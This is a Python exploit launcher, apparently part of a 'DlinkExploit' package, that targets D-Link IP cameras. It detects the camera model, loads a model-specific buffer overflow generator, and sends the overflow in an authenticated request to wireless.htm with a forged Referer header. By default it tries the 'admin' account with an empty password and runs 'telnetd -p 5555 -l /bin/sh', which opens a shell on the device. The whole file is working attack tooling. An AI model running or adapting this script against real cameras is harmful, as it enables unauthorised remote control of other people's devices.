#!/usr/bin/python3

import sys
import argparse
import requests
import importlib

from DlinkExploit import version
from DlinkExploit import util


def exploit_target(target_ip, target_port, command, username, password):
    """
    Perform target exploitation.

    :param target_ip: IP address of the target.
    :type target_ip: str

    :param target_port: Listening port of alphapd.
    :type target_port: str

    :param command: Command to execute on the target after exploitation is
                    complete.
    :type command: str

    :param username: Username for HTTP authentication.
    :type username: str

    :param password: Password for HTTP authentication.
    :type password: str
    """
    if username is None or password is None:
        print('Username and password are required for exploitation.')
        sys.exit(-1)

    # Must have a value in the referer field of the HTTP header or a request
    # Forbidden is returned. Doesn't seem to like if port 80 is in the referer
    # field so handle it differently here.
    if target_port == '80':
        url = 'http://%s/wireless.htm' % target_ip
        referer = 'http://%s/wizard.htm' % target_ip
    else:
        url = 'http://%s:%s/wireless.htm' % (target_ip, target_port)
        referer = 'http://%s:%s/wizard.htm' % (target_ip, target_port)

    try:
        camera_version = version.get_camera_version(target_ip, target_port)
    except:
        sys.exit(-1)

    print('%s' % camera_version)

    # This might get tedious if the models aren't consistent, but its pretty
    # simple for now.
    try:
        target_camera = 'DlinkExploit.overflows.%s' % camera_version.model
        camera_overflow = importlib.import_module(target_camera)
    except ModuleNotFoundError:
        print('Target model, (%s), not found.' % camera_version.model)
        sys.exit(-1)

    camera_overflow = camera_overflow.Overflow()
    url = url + camera_overflow.generate(camera_version, command)

    print('URL: %s' % url)

    auth = util.create_http_auth(target_ip, target_port, username, password)
    if auth is None:
        print('Invalid authentication type. Neither basic or digest are '
              'supported.')
        sys.exit(-1)

    try:
        r = requests.get(url, auth=auth, headers={'Referer': referer})
        print('Status: %s' % r.status_code)
    except:
        pass


if __name__ == '__main__':

    parser = argparse.ArgumentParser()

    parser.add_argument('-i', '--ip', help='Target IP address.')
    parser.add_argument('-P', '--port', help='Target Port.', default='80')
    parser.add_argument('-c', '--command', default='telnetd -p 5555 -l /bin/sh',
                        help='Command to execute after exploitation.')
    parser.add_argument('-u', '--user', help='Username for authentication',
                        default='admin')
    parser.add_argument('-p', '--password', help='Password for authentication.',
                        default='')

    args = parser.parse_args()

    exploit_target(args.ip, args.port, args.command, args.user, args.password)
